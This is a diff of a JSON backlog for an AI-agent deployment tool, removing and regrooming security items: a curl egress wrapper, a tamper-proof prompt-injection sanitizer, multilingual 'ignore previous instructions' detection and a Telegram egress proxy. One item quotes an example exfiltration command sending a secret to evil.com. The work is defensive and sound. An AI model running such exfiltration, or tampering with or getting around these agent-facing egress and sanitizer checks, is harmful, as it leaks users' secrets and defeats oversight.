@@ -183,7 +183,7 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "M-L item. Phased approach: (1) compose.ts — add enableTelegramProxy option to ComposeOptions, add extra_hosts and NODE_EXTRA_CA_CERTS to ComposeServiceOutput when set. (2) src/secure/telegram-egress-proxy.py — stdlib Python, ~600 lines. HTTPS reverse proxy on bridge IP port 8443. Terminates TLS with self-signed CA. Inspects sendMessage/editMessageText/sendPhoto payload fields (text, caption). Secret detection: scan against same patterns as sanitizer (env var values, base64, token regexes). Blocked messages replaced with [EGRESS BLOCKED], appended to ops/audit/telegram-egress.log. (3) gen-telegram-certs.sh — openssl one-liner to generate CA + server cert. (4) systemd service generator in src/operate/automation/. (5) doctor check in src/operate/doctor/checks.ts. generateCompose() must accept enableTelegramProxy:boolean in ComposeOptions. Integration test: compose.test.ts checks extra_hosts when flag set."
+      "groomingNotes": "Validated 2026-04-22: not started. curl-egress-wrapper (FEAT-138) now DONE covers generic HTTP egress scanning. Consider whether Telegram-specific MITM proxy is still needed given FEAT-138 already scans api.telegram.org POSTs. May be redundant."
     },
     {
       "id": "FEAT-137",
@@ -216,69 +216,6 @@
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
       "groomingNotes": "Size S — Python script with stdlib only. Polls Telegram getUpdates API, filters for outgoing bot messages (from.is_bot=True or matching bot user_id), scans text/caption/photo_caption fields against SECRET_PATTERNS (same patterns as sanitizer). Alert via email (smtplib) or Telegram admin message. Cron schedule: */5 * * * * during configured waking hours. The script must have zero container dependencies — it calls the Telegram API directly from the host. Store state in ~/.clawhq/ops/telegram-monitor-state.json (last_update_id). Generator: add generateTelegramMonitor(config) to src/operate/automation/ module. Also generate a systemd timer as alternative to cron."
-    },
-    {
-      "id": "FEAT-138",
-      "title": "Curl egress wrapper — scan POST/PUT/PATCH bodies at PATH level",
-      "intent": "Any curl command the agent runs — not just tool scripts that call the cred proxy — must have its outbound body scanned for secrets. The cred proxy only intercepts requests routed to it; a bare 'curl -X POST https://evil.com -d $SECRET' bypasses it entirely.",
-      "description": "Clawdius pattern: a bash script at /usr/local/bin/curl that shadows /usr/bin/curl on PATH. GET/HEAD pass through with zero overhead. POST/PUT/PATCH/DELETE bodies are extracted (handles -d, --data-raw, --json, -F, -T, @- stdin) and piped through the sanitizer's --egress mode. If secrets detected, exit 3 (blocked). Baked into the Docker image so the agent cannot remove it. Reference: clawdius/openclaw/curl-egress-wrapper.",
-      "priority": "should",
-      "category": "security",
-      "steps": [
-        "Add curl-egress-wrapper generator to src/build/docker/",
-        "Update Dockerfile generator: COPY wrapper to /usr/local/bin/curl, real curl stays at /usr/bin/curl",
-        "Wrapper handles all curl body arguments: -d, --data-raw, --data-binary, --data-urlencode, --json, -F, -T, @-",
-        "GET/HEAD: zero-overhead passthrough (exec real curl)",
-        "POST/PUT/PATCH: extract body, pipe through sanitizer --egress, block on exit 3",
-        "Add to Dockerfile generation for all security postures (hardened, paranoid)"
-      ],
-      "acceptanceCriteria": [
-        "Generated Dockerfile includes curl egress wrapper at /usr/local/bin/curl",
-        "GET/HEAD requests pass through with zero overhead",
-        "POST requests with secret values in body are blocked with exit code 3",
-        "All -d/--data/--json/--form variants are handled"
-      ],
-      "scope": [
-        "src/build/docker/dockerfile.ts"
-      ],
-      "dependsOn": [],
-      "status": "todo",
-      "passes": false,
-      "readyForSprint": true,
-      "groomedAt": "2026-03-31",
-      "groomingNotes": "Generator adds curl-egress-wrapper.sh to the Stage2 Docker image. Script location in generator: src/build/docker/curl-egress-wrapper.sh (static asset, not generated). Dockerfile copies to /usr/local/bin/curl with chmod 755. Real curl stays at /usr/bin/curl. Wrapper logic: parse argv for method (default GET), if GET/HEAD exec real curl. If POST/PUT/PATCH/DELETE: extract body from -d/--data-raw/--data-binary/--data-urlencode/--json/-F/-T/@- flags, pipe through /opt/clawwall/sanitize --egress, if exit 3 abort. Tests: unit tests for body extraction logic from bash (run with bats or inline node). Scope is only src/build/docker/dockerfile.ts + the new static wrapper script. Not added for minimal security posture."
-    },
-    {
-      "id": "FEAT-139",
-      "title": "Immutable sanitizer layer — bake ClawWall into read-only image with hash verification",
-      "intent": "The prompt injection scanner must be tamper-proof. If the agent can modify or delete the sanitizer, all inbound content scanning is defeated. The sanitizer must be baked into the Docker image at a read-only path with runtime integrity verification.",
-      "description": "Clawdius pattern: sanitize is COPY'd to /opt/clawwall/ during image build. chmod 444, chown root:root, and SHA256 hash computed and stored alongside. At runtime, every invocation verifies its own hash against the baked-in expected hash — fail-closed if tampered. The workspace copy is separate (for agent-initiated updates) but the /opt/clawwall/ copy is immutable. Reference: clawdius/openclaw/Dockerfile lines 152-162.",
-      "priority": "should",
-      "category": "security",
-      "steps": [
-        "Update Dockerfile generator: COPY sanitizer to /opt/clawwall/sanitize and /opt/clawwall/sanitize.py",
-        "Add sha256sum step at build time, store hash at /opt/clawwall/sanitize.sha256",
-        "Set permissions: chmod 555 /opt/clawwall/, chmod 444 on files, chown root:root",
-        "Add self-integrity check to sanitizer: verify hash on every invocation, fail-closed on mismatch",
-        "Update tool generators: tools import from /opt/clawwall/ (immutable) not workspace (mutable)",
-        "Add doctor check: verify /opt/clawwall/ exists and hash matches"
-      ],
-      "acceptanceCriteria": [
-        "Generated Dockerfile bakes sanitizer into /opt/clawwall/ with root ownership and 444 permissions",
-        "SHA256 hash is computed at build time and stored alongside",
-        "Sanitizer verifies its own integrity on every invocation",
-        "Integrity check failure causes fail-closed abort (not silent passthrough)"
-      ],
-      "scope": [
-        "src/build/docker/dockerfile.ts",
-        "src/secure/sanitizer/"
-      ],
-      "dependsOn": [],
-      "status": "todo",
-      "passes": false,
-      "readyForSprint": true,
-      "groomedAt": "2026-03-31",
-      "groomingNotes": "Two parts: (1) Dockerfile generator changes in generateStage2Dockerfile — add COPY sanitize /opt/clawwall/sanitize, RUN sha256sum /opt/clawwall/sanitize > /opt/clawwall/sanitize.sha256, chmod 444, chown root:root. (2) Sanitizer self-integrity check — on startup, re-compute sha256 of own file and compare to /opt/clawwall/sanitize.sha256. Mismatch = process.exit(1). The immutable /opt/clawwall/ path is separate from the workspace copy (which the agent can update). Tools should import from /opt/clawwall/ path for scanning. Check generateStage2Dockerfile signature carefully — it may need a new security posture param to conditionally include this block. Tests: dockerfile.test.ts for the COPY/chmod/sha256sum block. sanitizer.test.ts for the self-check behavior."
     },
     {
       "id": "FEAT-140",
@@ -465,34 +402,6 @@
       "groomingNotes": "From Clawdius 10/10 code review. Depends on FEAT-136 (Telegram proxy exists first). Size XS once the proxy exists."
     },
     {
-      "id": "FEAT-146",
-      "title": "Multilingual injection patterns — expand ClawWall coverage to 15+ languages",
-      "intent": "A prompt injection in Turkish, Hindi, or Portuguese currently bypasses all multilingual detection. Coverage must match the languages an attacker would reasonably try.",
-      "description": "The sanitizer covers 8 languages for 'ignore previous instructions' (French, Spanish, German, Japanese, Chinese, Korean, Russian, Arabic). Add at minimum: Hindi, Turkish, Portuguese, Vietnamese, Thai, Indonesian, Italian. Reference: Clawdius FEAT-068.",
-      "priority": "should",
-      "category": "security",
-      "steps": [
-        "Add injection patterns for: Hindi, Turkish, Portuguese, Vietnamese, Thai, Indonesian, Italian",
-        "Validate translations with correct word order for regex (not just machine translation)",
-        "Add test cases for each new language",
-        "Update sanitizer to load new patterns"
-      ],
-      "acceptanceCriteria": [
-        "Sanitizer detects 'ignore previous instructions' in at least 15 languages",
-        "Test cases exist for each supported language",
-        "No false positives on normal text in each language"
-      ],
-      "scope": [
-        "src/secure/sanitizer/detect.ts"
-      ],
-      "dependsOn": [],
-      "status": "todo",
-      "passes": false,
-      "readyForSprint": true,
-      "groomedAt": "2026-03-31",
-      "groomingNotes": "MULTILINGUAL_INJECTION in patterns.ts has 8 patterns (French, Spanish, German, Japanese, Chinese, Korean, Russian, Arabic). Add 7 more: Italian, Turkish, Portuguese, Vietnamese, Thai, Indonesian, Hindi. Use word-order-correct regex — NOT machine translation of English regex. Each language needs correct verb-object order and script. Thai/Vietnamese need Unicode-aware patterns. Test file must have one describe block per new language with an injection string and a safe string. Verify commands test actual detection behavior, not source structure."
-    },
-    {
       "id": "FEAT-147",
       "title": "Egress firewall test suite — prove the firewall works after every apply",
       "intent": "Firewall rules must be tested, not trusted. A test suite that runs from inside the container must verify: allowed domains connect, blocked domains reject, blocked ports reject. Without this, regressions are silent.",
@@ -671,41 +580,11 @@
       "groomingNotes": "FEAT-136 defines the proxy itself. This item is about compose generation and cert infrastructure. The proxy script is a static Python3 asset (~600 lines from the manual prototype, generalized). Secret patterns to scan: look for env var values from .env file, common token patterns (sk-ant-*, ghp_*, Bearer tokens). The extra_hosts trick works because Docker resolves it before DNS — the container thinks it's talking to api.telegram.org but traffic goes to the local proxy. The proxy terminates TLS, scans the HTTP payload, then forwards to the real api.telegram.org. Cert generation runs once during clawhq init, not on every build. Certs stored in ops/security/telegram-proxy-certs/. Only generated for Telegram — other channels don't have this attack surface (WhatsApp uses a different protocol, Discord uses webhooks)."
     },
     {
-      "id": "FEAT-157",
-      "title": "Enrich morning-brief and construct skills to prototype quality",
-      "intent": "Existing platform skills morning-brief and construct must match the manual prototype's quality with proper prompt templates and phase documentation.",
-      "description": "Split from original FEAT-156. Enrich the existing morning-brief skill with gather/compose prompt templates for email/calendar/tasks/trading. Enrich the existing construct skill with 5-phase cycle detail (assess, propose, build, deploy, validate).",
-      "priority": "should",
-      "category": "skills",
-      "steps": [
-        "Enrich morning-brief: add gather template (what sources to check per profile) and compose template (how to format the briefing)",
-        "Enrich construct: add 5-phase cycle detail (assess, propose, build, deploy, validate) with clear behavioral guidance per phase",
-        "Add tests verifying enriched content is present in generated skill files"
-      ],
-      "acceptanceCriteria": [
-        "morning-brief SKILL.md includes gather and compose prompt templates",
-        "construct SKILL.md includes 5-phase cycle documentation",
-        "Enriched skills still load correctly via skill_bundle.included",
-        "Tests verify enriched content"
-      ],
-      "scope": [
-        "src/design/skills/platform/morning-brief/",
-        "src/design/skills/platform/construct/"
-      ],
-      "dependsOn": [
-        "FEAT-152"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
-      "groomedAt": "2026-04-08",
-      "groomingNotes": "Split from FEAT-156. morning-brief and construct are platform skills created by FEAT-152. Check if they already exist under src/design/skills/platform/ — if not, they may be under a different path. morning-brief enrichment: add the gather template (what to check) and compose template (how to format) from the manual prototype, generalized for any blueprint profile. construct enrichment: add the 5-phase cycle (assess current state, propose changes, build implementation, deploy changes, validate results)."
-    },
-    {
       "id": "FEAT-164",
       "title": "One default tone ('LifeOps, no BS') — back out personality as product axis",
       "intent": "Ship one opinionated SOUL.md with every blueprint — the fourth option OpenClaw doesn't have (beyond empty, C-3PO, Architect/CEO). Supportive without flattery. The product is the operational stack — tools, skills, cron, security. Personality is a quality-of-life detail, not a feature.",
       "description": "Remove personality archetypes, persona presets, and personality-per-profile pairings as product concepts. The SOUL.md compiler produces one professional default tone for all profiles. Users customize via soul_overrides (free text) and a warmth slider. Domain-specific behavior (how the agent drafts outreach, structures reports, triages email) lives in skills and AGENTS.md playbooks, not personality config. Clean up legacy personality YAMLs in configs/personalities/ — keep digital-assistant as the default, archive the rest. Remove personality as a required field in CompositionConfig. The compiler should work without a personality field.",
-      "priority": "should",
+      "priority": "must",
       "category": "core",
       "steps": [
         "Make personality optional in CompositionConfig (src/design/catalog/types.ts) — default to built-in professional tone when omitted",
@@ -733,7 +612,7 @@
       "status": "todo",
       "readyForSprint": true,
       "groomedAt": "2026-04-09",
-      "groomingNotes": "Personality archetypes explored 2026-04-09, decision confirmed. User memory records 'personality not a product axis'. Steps are implementable as written. Key implementation note: when making personality optional in CompositionConfig, generateDimensionSoul() must produce complete professional SOUL.md without relying on any personality field — the domain-specific insight from archetype research (structured findings, BLUF, brevity, anticipation) gets baked into the single default, not exposed as choices. soul_overrides still appends free text. warmth slider stays (1-5). Critical test: compiler.test.ts must verify config with no personality field produces valid non-empty SOUL.md. Setting readyForSprint:true as of 2026-04-16 — previously blocked on archetype decision, that decision is now made."
+      "groomingNotes": "Validated 2026-04-22: Decision is locked (user memory: personality not product axis, one default tone LifeOps no BS) but code still requires personality field in CompositionConfig (types.ts:82) and compiler.ts calls loadPersonality(config.personality) without optional handling. Upgrading to must — decision/code mismatch."
     },
     {
       "id": "FEAT-165",
@@ -886,34 +765,7 @@
       "status": "todo",
       "readyForSprint": true,
       "groomedAt": "2026-04-16",
-      "groomingNotes": "renderBootstrap() is in compiler.ts. Currently only tools with required:true get health checks. Implementation: after required tools section, add an optional tools section with non-fatal bash checks. Pattern: each optional check runs the tool with a health/check invocation, captures exit code, logs 'WARNING: <tool> unavailable (optional)' on failure instead of EXIT 1. The agent reads BOOTSTRAP.md at session start — it will see the degraded state and can note it in greeting. Grading: optional tool failure must NOT set a non-zero exit code that aborts startup. Test in compiler.test.ts: config with optional tool produces check block with non-fatal failure path."
-    },
-    {
-      "id": "FEAT-170",
-      "title": "Egress allowlist must include Fastmail JMAP domains",
-      "intent": "When the egress firewall is enabled, email-fastmail will be blocked because api.fastmail.com and www.fastmailusercontent.com are not in the allowlist. The allowlist was generated for Gmail/iCloud but not Fastmail.",
-      "description": "The deployed allowlist.yaml includes imap.gmail.com/smtp.gmail.com and caldav.icloud.com but not Fastmail JMAP domains. The firewall chain isn't currently active so this doesn't bite yet, but enabling it would break Fastmail email. buildAllowlistFromBlueprint() in firewall.ts should pull egress domains from all configured providers, not just the primary email integration.",
-      "priority": "should",
-      "category": "secure",
-      "steps": [
-        "Ensure allowlist generation includes egress domains for ALL configured providers",
-        "For life-ops profile: add api.fastmail.com and www.fastmailusercontent.com",
-        "Verify collectIntegrationDomains() in firewall.ts picks up fastmail-jmap provider",
-        "Add test: profile with 2 email providers produces allowlist with both sets of domains"
-      ],
-      "acceptanceCriteria": [
-        "Enabling egress firewall does not break email-fastmail JMAP connectivity",
-        "allowlist.yaml includes domains for all configured providers",
-        "clawhq doctor warns if a deployed tool's egress domains are missing from allowlist"
-      ],
-      "scope": [
-        "src/build/launcher/firewall.ts",
-        "src/design/catalog/compiler.ts"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
-      "groomedAt": "2026-04-16",
-      "groomingNotes": "collectIntegrationDomains() in firewall.ts reads providers and emits egress domains. Fastmail JMAP provider needs: api.fastmail.com, www.fastmailusercontent.com, jmap.fastmail.com. Fix is in the provider registry (providers.ts or domain map inside firewall.ts) — add fastmail-jmap provider entry with these domains. Then verify buildAllowlistFromBlueprint() picks them up when a profile includes the fastmail-jmap integration. Small scope: likely 2 file changes. Test: firewall.test.ts profile-with-fastmail produces allowlist containing api.fastmail.com. Also check if the life-ops blueprint already has fastmail-jmap in its integrations — if so, verify the fix makes doctor pass."
+      "groomingNotes": "Validated 2026-04-22: PARTIAL. renderBootstrap() in compiler.ts line 765+ filters profile.tools.filter(t=>t.required) — only required tools health-checked. Optional tools identified in data model (line 647 marks optional with asterisk) but not in bootstrap. Implementation: add separate optional-tools section with non-fatal checks."
     },
     {
       "id": "REFACTOR-171",
@@ -1083,166 +935,6 @@
       "groomingNotes": null
     },
     {
-      "id": "AUDIT-177",
-      "title": "Remove secret scanner — replace with gitleaks recommendation",
-      "intent": "Our custom 20-pattern regex scanner is a worse version of established tools (gitleaks, trufflehog). Remove it to reduce maintenance burden and false confidence.",
-      "description": "src/secure/scanner/ reimplements secret detection with 20 regex patterns. gitleaks has 800+ actively maintained patterns with better false-positive suppression. Remove our scanner, add a doctor check that recommends gitleaks if not installed, and update clawhq scan to shell out to gitleaks when available.",
-      "priority": "should",
-      "category": "secure",
-      "steps": [
-        "Remove src/secure/scanner/ directory (patterns.ts, scanner.ts, git.ts, walk.ts, types.ts, index.ts)",
-        "Remove scanner tests",
-        "Update src/cli/commands/ to remove scan subcommand or redirect to gitleaks",
-        "Add doctor check: gitleaks binary available (advisory, not blocking)",
-        "Update any imports referencing the scanner module",
-        "Remove scanner from barrel exports"
-      ],
-      "acceptanceCriteria": [
-        "src/secure/scanner/ directory no longer exists",
-        "No broken imports reference the removed module",
-        "clawhq scan either delegates to gitleaks or prints recommendation to install it",
-        "Build passes, all remaining tests pass"
-      ],
-      "scope": [
-        "src/secure/scanner/",
-        "src/cli/commands/"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
-      "track": "audit",
-      "groomedAt": null,
-      "groomingNotes": null
-    },
-    {
-      "id": "AUDIT-178",
-      "title": "Demote HMAC audit trail to simple JSONL logging",
-      "intent": "HMAC chaining provides tamper evidence only with an external verifier. Since key and logs live on the same machine, an attacker can recompute the chain. Remove security theater, keep the useful logging.",
-      "description": "src/secure/audit/logger.ts implements HMAC-SHA256 chaining and sequence counters for tamper evidence. Without external attestation this is unverifiable. Strip HMAC chaining, sequence counters, and tamper-evident claims. Keep the append-only JSONL logging (tool exec, egress, secrets, approvals) which is genuinely useful for debugging and compliance.",
-      "priority": "should",
-      "category": "secure",
-      "steps": [
-        "Remove computeChainedHmac() and lastSecretHmac state from logger.ts",
-        "Remove secretWriteMutex serialization (no longer needed without chain)",
-        "Remove initSeqCounter() and seqCounters map",
-        "Remove hmac and seq fields from log entries in all four streams",
-        "Simplify SecretLifecycleEvent type to remove hmac/prevHmac/seq fields",
-        "Update audit reader to not expect/validate HMAC fields",
-        "Remove OWASP export HMAC references",
-        "Update tests"
-      ],
-      "acceptanceCriteria": [
-        "Audit logger writes plain JSONL with timestamp, event type, and payload",
-        "No HMAC computation, no sequence counters, no tamper-evident claims",
-        "All four log streams (tool, egress, secret, approval) still function",
-        "Reader and CLI output still work",
-        "Tests pass"
-      ],
-      "scope": [
-        "src/secure/audit/"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
-      "track": "audit",
-      "groomedAt": null,
-      "groomingNotes": null
-    },
-    {
-      "id": "AUDIT-179",
-      "title": "ClawWall sanitizer — keep Tier 1, remove Tier 2 detection claims",
-      "intent": "Tier 1 checks (invisible unicode, delimiter spoofing, encoded payloads) catch deterministic attacks. Tier 2 checks (semantic override, indirect elicitation) are fundamentally unreliable via regex and create false confidence.",
-      "description": "src/secure/sanitizer/detect.ts has 16 threat categories across two tiers. Tier 2 categories (homoglyph, morse, fewshot, multilingual, semantic override, indirect elicitation, leetspeak) attempt to detect adversarial prompt injection via regex, which security researchers agree has a low ceiling. Keep Tier 1 (invisible_unicode, injection_keyword, delimiter_spoof, encoded_payload, decode_instruction, exfil_markup, exfil_instruction, secret_leak). Remove or downgrade Tier 2 to advisory-only with clear documentation that regex cannot reliably detect adversarial injection.",
-      "priority": "should",
-      "category": "secure",
-      "steps": [
-        "Remove Tier 2 detection functions from detect.ts (homoglyph, morse, fewshot, multilingual, semantic_override, indirect_elicitation, leetspeak_obfuscation)",
-        "Remove corresponding patterns from patterns.ts (CONFUSABLE_MAP, EXTENDED_CONFUSABLE_MAP, LEETSPEAK_MAP, MORSE_PATTERN, FEWSHOT_PATTERNS, QA_FEWSHOT_PATTERNS, MULTILINGUAL_INJECTION, SEMANTIC_OVERRIDE_PATTERNS, ELICITATION_PATTERNS)",
-        "Remove ThreatCategory union members for removed categories",
-        "Update sanitizer.ts scoring to only use Tier 1",
-        "Update tests to remove Tier 2 expectations",
-        "Add comment documenting that Tier 1 catches encoding tricks, not adversarial injection"
-      ],
-      "acceptanceCriteria": [
-        "Only Tier 1 threat categories remain in detect.ts",
-        "Removed patterns no longer exist in patterns.ts",
-        "Sanitizer still catches invisible unicode, delimiters, encoding, exfil, secrets",
-        "No claims about detecting semantic or adversarial injection",
-        "Tests pass"
-      ],
-      "scope": [
-        "src/secure/sanitizer/"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
-      "track": "audit",
-      "groomedAt": null,
-      "groomingNotes": null
-    },
-    {
-      "id": "AUDIT-180",
-      "title": "Demote cryptographic destroy to simple verified deletion",
-      "intent": "Self-signed cryptographic proof of destruction (hash manifest + HMAC with included key) is unverifiable without external attestation. Remove the theater, keep the thorough deletion.",
-      "description": "src/evolve/lifecycle/destroy.ts generates an HMAC-signed proof of destruction including file hashes, witness hash, and one-time key. Since the key is included in the proof and no external party attests, this is a self-signed receipt that proves nothing. Keep the thorough file deletion, container shutdown, and confirmation flow. Remove the cryptographic proof generation.",
-      "priority": "should",
-      "category": "evolve",
-      "steps": [
-        "Remove computeChainedHmac / witness hash / one-time key generation from destroy.ts",
-        "Remove DestructionProof type or simplify to a deletion receipt (list of deleted files, timestamp)",
-        "Keep container stop, file enumeration, and recursive deletion logic",
-        "Keep the confirmation prompt and dry-run mode",
-        "Simplify DestroyResult to not include cryptographic fields",
-        "Update tests"
-      ],
-      "acceptanceCriteria": [
-        "clawhq destroy still stops container, enumerates files, deletes everything",
-        "No cryptographic proof generation (no HMAC, no witness hash, no one-time key)",
-        "Deletion receipt is a simple JSON with files deleted and timestamp",
-        "Confirmation prompt and dry-run still work",
-        "Tests pass"
-      ],
-      "scope": [
-        "src/evolve/lifecycle/destroy.ts",
-        "src/evolve/lifecycle/types.ts"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
-      "track": "audit",
-      "groomedAt": null,
-      "groomingNotes": null
-    },
-    {
-      "id": "AUDIT-181",
-      "title": "Simplify skill vetting scanner to obvious-risk-only detection",
-      "intent": "Regex-based code scanning cannot reliably detect obfuscated malware. Keep the vetting pipeline but limit the scanner to flagging obvious risks (outbound HTTP, shell exec, file writes outside workspace). The real defense is the approval gate + egress firewall.",
-      "description": "src/evolve/skills/vet.ts scans skill source code with regex patterns for URL traps, shell execution, file access, injection patterns, and encoded payloads. The encoded payload and injection pattern detection creates false confidence. Simplify to only flag: (1) outbound HTTP/fetch calls to non-allowlisted domains, (2) subprocess spawning (exec/spawn/system), (3) file writes outside workspace. Remove injection pattern reuse from sanitizer and encoded payload detection.",
-      "priority": "should",
-      "category": "evolve",
-      "steps": [
-        "Simplify vet.ts to three check categories: outbound_http, shell_exec, file_escape",
-        "Remove injection pattern imports from sanitizer",
-        "Remove encoded payload detection",
-        "Remove obfuscation detection (these bypass regex trivially)",
-        "Keep the stage → vet → approve → activate pipeline unchanged",
-        "Update VetFindingCategory type to match simplified categories",
-        "Update tests"
-      ],
-      "acceptanceCriteria": [
-        "Skill vetting only flags: outbound HTTP, shell execution, file writes outside workspace",
-        "No imports from sanitizer module",
-        "No encoded payload or obfuscation detection",
-        "Pipeline (stage → vet → approve → activate) still works end-to-end",
-        "Tests pass"
-      ],
-      "scope": [
-        "src/evolve/skills/vet.ts",
-        "src/evolve/skills/types.ts"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
-      "track": "audit",
-      "groomedAt": null,
-      "groomingNotes": null
-    },
-    {
       "id": "AUDIT-182",
       "title": "Prepare landmine validator as OpenClaw contribution",
       "intent": "The 14-rule landmine validator is original research catching real silent failures. This is our strongest candidate for an OpenClaw upstream contribution — both idea and implementation.",
@@ -1376,45 +1068,6 @@
       "status": "todo",
       "passes": false,
       "readyForSprint": false,
-      "track": "core",
-      "groomedAt": null,
-      "groomingNotes": null
-    },
-    {
-      "id": "FEAT-185",
-      "title": "Closed-loop deploy — verify every integration works before declaring healthy",
-      "intent": "Deploy should prove the agent can do its job, not just that the container started. Every bug we hit with Clawdius was invisible at deploy time — firewall silently dropping email, LLM timing out, cron jobs fighting over GPU. A verify step after deploy that tests every configured integration end-to-end catches these at deploy time instead of 3 hours later.",
-      "description": "Add a verify phase to the deploy pipeline (after health, before smoke test) that runs integration-specific probes through the running container. IMAP connect, SMTP connect, LLM generate (measures actual response time vs timeout budget), API auth checks, firewall passthrough verification. Uses existing credential probes (src/secure/credentials/probes.ts) and doctor checks, wired into the deploy orchestrator. Failed verifications are warnings (non-blocking) with actionable fix suggestions.",
-      "priority": "should",
-      "category": "build",
-      "steps": [
-        "Define VerifyResult type and per-integration verify functions",
-        "Wire existing credential probes (probeAnthropic, probeOpenAI, probeTelegram) into verify step",
-        "Add IMAP/SMTP connection test (TCP connect + auth handshake via himalaya or raw socket)",
-        "Add LLM response time test — generate a short response and measure latency vs WEBSOCKET_EVENT_CALLER_TIMEOUT",
-        "Add firewall passthrough test — verify allowlisted domains are reachable from inside container",
-        "Wire verify step into deploy.ts between health-verify and smoke-test",
-        "Format verify results as table (like doctor output) with fix suggestions for failures",
-        "Add --skip-verify flag for fast restarts",
-        "Add standalone clawhq verify command for post-deploy re-verification"
-      ],
-      "acceptanceCriteria": [
-        "clawhq up runs verify step after health check, before smoke test",
-        "Every configured integration with credentials gets a live probe",
-        "LLM response time is measured and compared to timeout budget",
-        "Failed verifications print actionable fix suggestions",
-        "Verify failures are warnings, not fatal — agent still starts",
-        "clawhq verify runs the same checks standalone",
-        "--skip-verify flag skips the step for fast restarts"
-      ],
-      "scope": [
-        "src/build/launcher/deploy.ts",
-        "src/build/launcher/verify.ts",
-        "src/secure/credentials/probes.ts",
-        "src/cli/commands/build.ts"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
       "track": "core",
       "groomedAt": null,
       "groomingNotes": null
